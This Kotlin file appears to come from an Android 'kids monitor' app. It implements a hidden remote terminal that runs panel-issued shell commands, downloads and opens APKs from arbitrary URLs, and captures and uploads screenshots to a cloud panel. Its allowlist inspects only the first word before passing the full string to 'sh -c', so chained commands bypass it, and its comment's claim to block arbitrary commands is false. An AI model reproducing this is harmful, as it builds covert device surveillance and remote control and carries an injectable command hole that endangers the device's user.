package com.kids.monitor

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import androidx.core.content.FileProvider
import com.kids.monitor.data.FirestoreSync
import com.kids.monitor.data.StorageUploader
import java.io.File
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.TimeUnit

/**
 * تريمينال داخلي مخفي: ينفّذ أوامر محدودة (قائمة بيضاء) ويُرجع المخرجات إلى لوحة التحكم.
 * لا يحتاج root، ولا يسمح بأوامر عشوائية.
 */
object TerminalService {

    private const val MAX_OUTPUT = 8000
    private const val RATE_LIMIT_MS = 3000L
    private const val PREFS = "monitor_prefs"
    private const val KEY_LAST = "terminal_last_at"

    private val allowedBinaries = setOf(
        "pm", "am", "input", "dumpsys", "settings", "getprop", "logcat",
        "wm", "screencap", "svc", "id", "uptime", "date", "df", "ps", "echo", "ls", "cat",
    )

    fun execute(context: Context, raw: String): Map<String, Any> {
        val command = raw.trim()
        if (command.isEmpty()) return fail("أمر فارغ")

        val prefs = context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
        val now = System.currentTimeMillis()
        val last = prefs.getLong(KEY_LAST, 0L)
        if (now - last < RATE_LIMIT_MS) return fail("انتظر 3 ثوانٍ بين الأوامر")
        prefs.edit().putLong(KEY_LAST, now).apply()

        if (command.startsWith("update ")) {
            return updateApp(context, command.removePrefix("update ").trim())
        }
        if (command.startsWith("install ")) {
            return installApk(context, command.removePrefix("install ").trim())
        }

        val binary = command.split(Regex("\\s+")).firstOrNull() ?: return fail("أمر غير صالح")
        if (binary !in allowedBinaries) {
            return fail("أمر غير مسموح: $binary")
        }
        if (binary == "pm" && !command.startsWith("pm list") && !command.startsWith("pm path") &&
            !command.startsWith("pm dump")
        ) {
            return fail("استخدم install <path> لتثبيت APK")
        }
        if (binary == "am" && !command.startsWith("am start") && !command.startsWith("am force-stop")) {
            return fail("أوامر am المسموحة: start / force-stop")
        }

        return try {
            val process = ProcessBuilder("sh", "-c", command)
                .redirectErrorStream(true)
                .start()
            val output = process.inputStream.bufferedReader().use { it.readText() }
            val finished = process.waitFor(12, TimeUnit.SECONDS)
            if (!finished) process.destroyForcibly()
            val code = if (finished) process.exitValue() else -1
            mapOf(
                "ok" to true,
                "message" to if (code == 0) "تم التنفيذ" else "انتهى بالرمز $code",
                "stdout" to output.take(MAX_OUTPUT),
                "exitCode" to code,
                "command" to command,
            )
        } catch (e: Exception) {
            fail(e.localizedMessage ?: "تعذر تنفيذ الأمر")
        }
    }

    /** تحميل تحديث APK من رابط ثم فتح شاشة التثبيت (يحتاج موافقة المستخدم مرة واحدة). */
    private fun updateApp(context: Context, url: String): Map<String, Any> {
        if (!url.startsWith("http")) return fail("رابط غير صالح")
        return try {
            val file = File(context.cacheDir, "update_${System.currentTimeMillis()}.apk")
            val connection = (URL(url).openConnection() as HttpURLConnection).apply {
                connectTimeout = 20000
                readTimeout = 60000
                instanceFollowRedirects = true
            }
            connection.inputStream.use { input ->
                file.outputStream().use { output -> input.copyTo(output) }
            }
            connection.disconnect()
            if (!file.exists() || file.length() < 100_000) return fail("ملف التحديث غير صالح")
            openInstaller(context, file)
            mapOf(
                "ok" to true,
                "message" to "تم تنزيل التحديث، أكمل التثبيت على الجهاز",
                "stdout" to "saved ${file.name} (${file.length()} bytes)",
                "exitCode" to 0,
            )
        } catch (e: Exception) {
            fail(e.localizedMessage ?: "تعذر تنزيل التحديث")
        }
    }

    private fun installApk(context: Context, path: String): Map<String, Any> {
        val file = File(if (path.startsWith("/")) path else File(context.cacheDir, path).absolutePath)
        if (!file.exists()) return fail("الملف غير موجود: $path")
        return try {
            openInstaller(context, file)
            mapOf("ok" to true, "message" to "تم فتح شاشة التثبيت", "stdout" to file.absolutePath, "exitCode" to 0)
        } catch (e: Exception) {
            fail(e.localizedMessage ?: "تعذر فتح المثبّت")
        }
    }

    private fun openInstaller(context: Context, file: File) {
        val uri: Uri = FileProvider.getUriForFile(context, context.packageName + ".fileprovider", file)
        val intent = Intent(Intent.ACTION_VIEW).apply {
            setDataAndType(uri, "application/vnd.android.package-archive")
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION)
        }
        context.startActivity(intent)
    }

    /** لقطة شاشة عبر screencap: تُحوَّل لصورة JPEG صغيرة وتُرفع إلى قسم الوسائط في اللوحة فقط. */
    fun screenshot(context: Context): Map<String, Any> {
        val file = File(context.cacheDir, "shot_${System.currentTimeMillis()}.png")
        val result = execute(context, "screencap -p ${file.absolutePath}")
        if (result["ok"] != true || !file.exists()) return result

        val jpg = File(context.cacheDir, "shot_${System.currentTimeMillis()}.jpg")
        try {
            val bmp = android.graphics.BitmapFactory.decodeFile(file.absolutePath)
            if (bmp != null) {
                val ratio = minOf(540f / bmp.width, 540f / bmp.height, 1f)
                val out = if (ratio < 1f) {
                    android.graphics.Bitmap.createScaledBitmap(
                        bmp,
                        (bmp.width * ratio).toInt().coerceAtLeast(1),
                        (bmp.height * ratio).toInt().coerceAtLeast(1),
                        true,
                    )
                } else bmp
                jpg.outputStream().use { out.compress(android.graphics.Bitmap.CompressFormat.JPEG, 50, it) }
                if (out !== bmp) out.recycle()
                bmp.recycle()
            }
        } catch (e: Exception) { /* تجاهل */ }
        file.delete()

        if (!jpg.exists() || jpg.length() == 0L) {
            val map = HashMap<String, Any>(result)
            map["message"] = "تم أخذ اللقطة لكن تعذر تحويلها"
            return map
        }
        val url = StorageUploader.uploadSync(jpg, "screenshots/${jpg.name}")
        val inline = if (url == null) StorageUploader.inlineData(jpg, 700_000) else null
        if (url == null && inline == null) {
            jpg.delete()
            val map = HashMap<String, Any>(result)
            map["message"] = "تعذر رفع اللقطة (تحقق من قواعد Storage)"
            return map
        }
        FirestoreSync.appendItem(
            context, "media",
            mapOf(
                "name" to "لقطة شاشة ${jpg.name}",
                "url" to (url ?: ""),
                "dataUrl" to (inline ?: ""),
                "type" to "image",
                "mimeType" to "image/jpeg",
                "size" to jpg.length(),
                "screenshot" to true,
                "timestamp" to System.currentTimeMillis(),
            ),
        )
        val map = HashMap<String, Any>(result)
        map["message"] = "تم التقاط اللقطة وإرسالها للوحة التحكم"
        jpg.delete()
        return map
    }

    fun deviceSummary(context: Context): Map<String, Any> {
        val sb = StringBuilder()
        sb.appendLine("Android ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})")
        sb.appendLine("Model: ${Build.MANUFACTURER} ${Build.MODEL}")
        sb.appendLine("Device: ${Build.DEVICE}")
        return mapOf("ok" to true, "message" to "بيانات الجهاز", "stdout" to sb.toString(), "exitCode" to 0)
    }

    private fun fail(message: String): Map<String, Any> =
        mapOf("ok" to false, "message" to message, "stdout" to "", "exitCode" to -1)
}
